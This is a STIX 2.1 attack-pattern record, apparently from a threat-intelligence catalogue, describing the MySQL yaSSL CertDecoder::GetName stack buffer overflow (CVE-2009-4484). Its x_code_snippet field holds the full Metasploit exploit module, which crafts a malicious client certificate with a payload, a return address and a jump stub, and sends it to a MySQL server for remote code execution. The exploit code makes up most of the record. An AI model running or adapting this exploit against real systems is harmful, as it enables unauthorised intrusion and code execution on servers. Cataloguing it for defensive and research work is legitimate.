{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7b0d433f-9020-4357-b266-08e80751f350",
    "created": "2024-08-14T17:04:46.325816Z",
    "modified": "2024-08-14T17:04:46.325821Z",
    "name": "MySQL yaSSL CertDecoder::GetName Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the yaSSL (1.9.8 and earlier) implementation bundled with MySQL. By sending a specially crafted client certificate, an attacker can execute arbitrary code.  This vulnerability is present within the CertDecoder::GetName function inside \"taocrypt/src/asn.cpp\". However, the stack buffer that is written to exists within a parent function's stack frame.  NOTE: This vulnerability requires a non-default configuration. First, the attacker must be able to pass the host-based authentication. Next, the server must be configured to listen on an accessible network interface.  Lastly, the server must have been manually configured to use SSL.  The binary from version 5.5.0-m2 was built with /GS and /SafeSEH. During testing on Windows XP SP3, these protections successfully prevented exploitation.  Testing was also done with mysql on Ubuntu 9.04. Although the vulnerable code is present, both version 5.5.0-m2 built from source and version 5.0.75 from a binary package were not exploitable due to the use of the compiler's FORTIFY feature.  Although suse11 was mentioned in the original blog post, the binary package they provide does not contain yaSSL or support SSL. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/mysql/mysql_yassl_getname.rb",
            "external_id": "mysql_yassl_getname.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-4484"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20100129041727/http://secunia.com:80/advisories/38344/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MySQL yaSSL CertDecoder::GetName Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the yaSSL (1.9.8 and earlier)\n        implementation bundled with MySQL. By sending a specially crafted\n        client certificate, an attacker can execute arbitrary code.\n\n        This vulnerability is present within the CertDecoder::GetName function inside\n        \"taocrypt/src/asn.cpp\". However, the stack buffer that is written to exists\n        within a parent function's stack frame.\n\n        NOTE: This vulnerability requires a non-default configuration. First, the attacker\n        must be able to pass the host-based authentication. Next, the server must be\n        configured to listen on an accessible network interface.  Lastly, the server\n        must have been manually configured to use SSL.\n\n        The binary from version 5.5.0-m2 was built with /GS and /SafeSEH. During testing\n        on Windows XP SP3, these protections successfully prevented exploitation.\n\n        Testing was also done with mysql on Ubuntu 9.04. Although the vulnerable code is\n        present, both version 5.5.0-m2 built from source and version 5.0.75 from a binary\n        package were not exploitable due to the use of the compiler's FORTIFY feature.\n\n        Although suse11 was mentioned in the original blog post, the binary package they\n        provide does not contain yaSSL or support SSL.\n      },\n      'Author'         => [ 'jduck' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2009-4484' ],\n          [ 'BID', '37640' ],\n          [ 'BID', '37943' ],\n          [ 'BID', '37974' ],\n          [ 'OSVDB', '61956' ],\n          [ 'URL', 'http://web.archive.org/web/20100129041727/http://secunia.com:80/advisories/38344/' ]\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1046,\n          'BadChars' => \"\",\n          'StackAdjustment' => -3500,\n          'DisableNops' => true\n        },\n      'Platform'       => 'linux',\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n          [ 'Debian 5.0 - MySQL (5.0.51a-24+lenny2)',  { 'JmpEsp' => 0x0807dc34 } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2010-01-25'))\n\n    register_options([ Opt::RPORT(3306) ], self)\n  end\n\n  def exploit\n\n    connect\n\n    # read the mysql server hello :)\n    version = nil\n    if (buf = sock.get_once(-1, 5) || '')\n      #print_status(\"\\n\" + Rex::Text.to_hex_dump(buf))\n      if (buf =~ /is not allowed to connect/)\n        fail_with(Failure::Unreachable, 'The server refused our connection!')\n      end\n\n      len1,cmd = buf[0,5].unpack('VC')\n      rest = buf[5,len1]\n      idx = rest.index(\"\\x00\")\n      if (idx)\n        version = rest[0,idx]\n        print_status(\"Server reports version: #{version}\")\n      end\n    end\n\n    # handle automatic target selection\n    mytarget = nil\n    if (target.name =~ /Automatic/)\n      print_status(\"Attempting to locate a corresponding target\")\n      version = \"(\" + version + \")\"\n      targets.each { |tgt|\n        if (tgt.name.include?(version))\n          mytarget = tgt\n        end\n      }\n\n      if (not mytarget)\n        fail_with(Failure::NoTarget, 'Unable to detect target automatically')\n      else\n        print_status(\"Using automatically detected target: #{mytarget.name}\")\n      end\n    else\n      mytarget = target\n      print_status(\"Trying target #{mytarget.name}...\")\n    end\n\n    # create/send the hello packet\n    hello = [0x01000020].pack('V')\n    hello << \"\\x85\\xae\\x03\\x00\"+\"\\x00\\x00\\x00\\x01\"+\"\\x08\\x00\\x00\\x00\"\n    hello << \"\\x00\" * 20\n    hello << \"\\x16\\x03\\x01\\x00\\x60\\x01\\x00\\x00\\x5c\\x03\\x01\\x4a\\x92\\xce\\xd1\\xe1\"\n    hello << \"\\xab\\x48\\x51\\xc8\\x49\\xa3\\x5e\\x97\\x1a\\xea\\xc2\\x99\\x82\\x33\\x42\\xd5\"\n    hello << \"\\x14\\xbc\\x05\\x64\\xdc\\xb5\\x48\\xbd\\x4c\\x11\\x55\\x00\\x00\\x34\\x00\\x39\"\n    hello << \"\\x00\\x38\\x00\\x35\\x00\\x16\\x00\\x13\\x00\\x0a\\x00\\x33\\x00\\x32\\x00\\x2f\"\n    hello << \"\\x00\\x66\\x00\\x05\\x00\\x04\\x00\\x63\\x00\\x62\\x00\\x61\\x00\\x15\\x00\\x12\"\n    hello << \"\\x00\\x09\\x00\\x65\\x00\\x64\\x00\\x60\\x00\\x14\\x00\\x11\\x00\\x08\\x00\\x06\"\n    hello << \"\\x00\\x03\\x02\\x01\\x00\"\n    sock.put(hello)\n\n\n    # build a cn that will trigger the vulnerability\n    cn = rand_text(payload_space - payload.encoded.length)\n    cn << payload.encoded\n    cn << [0,0].pack('VV') # memset(x,0,0); (this is x and the length)\n    # NOTE: x in above (also gets passed to free())\n    pad = 1074 - payload_space\n    cn << rand_text(pad)\n    cn << [mytarget['JmpEsp']].pack('V')\n    distance = 4 + pad + 8 + payload.encoded.length\n    cn << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + distance.to_s).encode_string\n\n    cert = \"\\x2a\\x86\\x00\\x84\"\n    cert << [cn.length].pack('N')\n    cert << cn\n    cert = \"\\x30\"+\n      \"\\x82\\x01\\x01\"+\n      \"\\x31\"+\n      \"\\x82\\x01\\x01\"+\n      \"\\x30\"+\n      \"\\x82\\x01\\x01\"+\n      \"\\x06\"+\n      \"\\x82\\x00\\x02\" +\n      cert\n\n    cert = \"\\xa0\\x03\" +\n      \"\\x02\\x01\\x02\" +\n      \"\\x02\\x01\\x00\" +\n      \"\\x30\" + \"\\x0d\" + \"\\x06\\x09\\x2a\\x86\\x48\\x86\\xf7\\x0d\\x01\\x01\\x04\\x05\\x00\" +\n      cert\n\n    # wrap in 2 sequences\n    cert = SNMP::BER.encode_tlv(0x30, cert)\n    cert = SNMP::BER.encode_tlv(0x30, cert)\n\n    cert1 = big_endian_24bit(cert.length) + cert\n    certs = big_endian_24bit(cert1.length) + cert1\n\n    handshake = \"\\x0b\" +  big_endian_24bit(certs.length) + certs\n    msg = \"\\x16\\x03\\x01\"\n    msg << [handshake.length].pack('n')\n    msg << handshake\n\n    sock.put(msg)\n\n    handler\n    disconnect\n  end\n\n\n  def big_endian_24bit(len)\n    uno = (len >> 16) & 0xff\n    dos = (len >> 8) & 0xff\n    tre = len & 0xff\n    [uno,dos,tre].pack('C*')\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-01-25",
    "x_mitre_platforms": [
        "linux'"
    ]
}